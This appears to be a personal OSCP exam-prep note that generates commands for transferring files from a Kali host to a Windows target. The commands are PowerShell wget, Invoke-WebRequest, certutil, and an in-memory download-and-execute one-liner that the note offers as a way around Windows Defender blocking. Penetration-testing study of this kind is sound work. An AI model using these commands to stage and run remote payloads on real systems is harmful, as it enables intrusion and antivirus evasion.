wget file from kali to window target
transfer file from kali to window target

# INPUT FILENAME

filename:: 
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const apage = dv.page("Synced OSCP Notes/Guides/Copy File From Kali to Windows target");const filename = page?.["filename"] ?? "NO FILENAME FOUND";

const command = `powershell wget http://${KaliIP}/${filename} -OutFile C:\\\Windows\\\Temp\\${filename}`;

dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const apage = dv.page("Synced OSCP Notes/Guides/Copy File From Kali to Windows target");const filename = page?.["filename"] ?? "NO FILENAME FOUND";

const command = `Invoke-WebRequest http://${KaliIP}:80/${filename} -OutFile ${filename}`;

dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const apage = dv.page("Synced OSCP Notes/Guides/Copy File From Kali to Windows target");const filename = page?.["filename"] ?? "NO FILENAME FOUND";

const command = `certutil -urlcache -split -f http://${KaliIP}:80/${filename} ${filename}`;

dv.paragraph("```bash\n" + command + "\n```");
```
Download and execute immediately, if getting blocked by AV antivirus windows defender
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const apage = dv.page("Synced OSCP Notes/Guides/Copy File From Kali to Windows target");const filename = page?.["filename"] ?? "NO FILENAME FOUND";

const command = `iex(new-object net.webclient).downloadstring('http://${KaliIP}:80/${filename}')`;

dv.paragraph("```bash\n" + command + "\n```");
```
